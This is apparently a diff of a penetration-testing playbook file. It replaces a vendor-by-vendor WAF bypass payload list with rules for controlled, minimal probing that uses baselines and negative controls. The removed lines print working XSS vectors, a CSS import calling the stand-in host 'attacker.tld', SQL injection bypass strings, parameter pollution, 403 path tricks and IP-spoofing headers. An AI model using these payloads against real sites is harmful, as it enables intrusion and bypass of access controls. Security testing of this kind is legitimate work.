@@ -1,117 +1,26 @@
-# PAYLOADS — WAF Bypass — By Vendor
+# Context payload lookup: waf bypass all techniques
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [waf_bypass_all_techniques.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/waf_bypass_all_techniques.md).
 
-## 15. WAF Bypass — By Vendor
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### CLOUDFLARE
-```
-# Origin discovery (skip CF entirely)
-- Search shodan/censys for cert SAN/JARM matching origin
-- Look for *.cf-origin.targetdomain.com / mail.tld / dev.tld / staging.tld
-- Use OriginIPCheck nuclei templates
-- DNSDB historical records before CF was applied
+## Select the experiment
 
-# Bypass at WAF layer
-- Newline + comment trick: <svg/onload=alert%0a(1)>
-- Use rare HTML5 events: ontoggle, onbeforetoggle, onpointerenter, onpointerover
-- Mixed encoding: %u003cscript%u003e
-- Double URL: %253Cscript%253E
-- Unicode chars: %u02BCscript> (rarely)
-- HTTP/2 smuggling on misconfigured edge
-- Path normalization: /admin/../admin → /admin (some bypass via /admin/.;/foo)
-- Method tampering (POST → PUT → PATCH → DELETE)
-- Custom Content-Type: application/json with body that breaks WAF parser
+- Contexts: Transport encoding / WAF parser / application parser / inspected component.
+- Identify which layer decodes each byte. Vendor identity is insufficient to choose a bypass. Prove the underlying application effect, not just removal of a block response.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-# Body parsing tricks (XSS)
-<svg/onload=alert(1)>
-<img src=x: onerror=alert(1)>
-<iframe src=javascript&#58;alert(1)>
-<a href="data:text/html,<script>alert(1)</script>">x</a>
-<input/onfocus=alert(1) autofocus>
-<details/open/ontoggle=alert(1)>
-```
+## Return to the owning methodology
 
-### AWS WAF
-```
-# alert\u0028 — Unicode bypass (ManagedRuleSet older versions)
-<script>alert\u00281)</script>
-# Mixed-case
-<sCRipT>aLerT(1)</sCRiPT>
-# Concat string
-<script>al\\u0065rt(1)</script>
-# Nested SVG
-<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
-# Body large enough to evade inspection (default 8KB body limit)
-<padding>~~~10KB of A's~~~</padding><script>alert(1)</script>
-```
-
-### AKAMAI
-```
-# AngularJS sandbox-style payloads even though no Angular
-<details ontoggle=alert(1) open>
-<math><mi xlink:href="data:x,<script>alert(1)</script>">
-# Concat in attribute
-<input onfocus="alert(1)" autofocus="">
-# Throwaway
-<input value=&NewLine;<svg/onload=alert(1)>>
-```
-
-### IMPERVA / INCAPSULA / F5 BIG-IP ASM
-```
-<style>@import 'http://attacker.tld/x.css';</style>     # CSS-based payload sometimes passes
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-
-<details ontoggle=alert(1) open>
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-# F5 sometimes blocks "alert(" but not "%61lert("
-<script>%61lert(1)</script>
-```
-
-### SQLI WAF BYPASS — GENERIC
-```
-/**/UnIoN/**/SeLeCt
-%23%0aselect
-+%55nion+%53elect+
-1';select%01pg_sleep(5)--
-1' OR '1'='1'%00
-1';/*!50000select*/ pg_sleep(5)-- -
-0e1234'OR'0e1234
-```
-
-### PARAM POLLUTION (HPP) FOR WAF SPLIT
-```
-?id=1&id=' OR '1'='1
-?id=1' OR '1'='1&id=2
-```
-
-### PATH TRICKS (403 BYPASS)
-```
-/admin → /admin/
-/admin → /admin/.
-/admin → /admin//
-/admin → /admin/..;/
-/admin → /Admin
-/admin → /%2e%2eadmin
-/admin → /admin?
-/admin → /admin#
-/admin → /admin..;/
-/admin → /admin;.html
-/admin → /admin.json
-/admin → /admin.css
-```
-
-### HEADER TRICKS
-```
-X-Original-URL: /admin
-X-Rewrite-URL: /admin
-X-Forwarded-For: 127.0.0.1
-X-Real-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Forwarded-Host: localhost
-True-Client-IP: 127.0.0.1
-CF-Connecting-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-```
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
